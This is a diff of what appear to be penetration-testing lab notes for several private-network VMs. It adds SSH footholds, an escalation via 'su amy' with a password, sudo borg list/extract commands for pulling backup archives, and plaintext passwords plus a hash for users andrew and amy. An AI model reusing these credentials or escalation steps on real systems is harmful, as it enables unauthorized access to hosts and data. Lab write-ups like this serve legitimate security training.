@@ -292,20 +292,29 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 ## Foothold
 ```
-    ssh sarah@172.16.140.20 -i backup-machine-ssh-sarah
+    ssh sarah@172.16.140.19 -i backup-machine-ssh-sarah
 ```
 
 ## Root
 ```
-User sarah may run the following commands on backup:
-    (ALL) NOPASSWD: /usr/bin/borg list *
-    (ALL) NOPASSWD: /usr/bin/borg extract *
-    (ALL) NOPASSWD: /usr/bin/borg mount *
-
+    su amy
+    backup1
 ```
-```
-borg init --encryption=none /home/sarah/test
 
+## Interesting cracking
+```
+sudo borg list /opt/borgbackup
+xinyVzoH2AnJpRK9sfMgBA [get from monitoring process | ]
+sudo borg extract /opt/borgbackup::home --stdout [if not works sometime can directly output]
+```
+
+## Interesting Info
+```
+sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
+{
+    "user": "amy",
+    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
+}
 ```
 
 # VM 8 .20
@@ -360,6 +369,12 @@ SF:lid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x0
 SF:5\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
 SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
 Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+```
+
+## Foothold
+```
+    ssh andrew@172.16.186.20 
+    Rb9kNokjDsjYyH
 ```
 
 # VM 9 .21
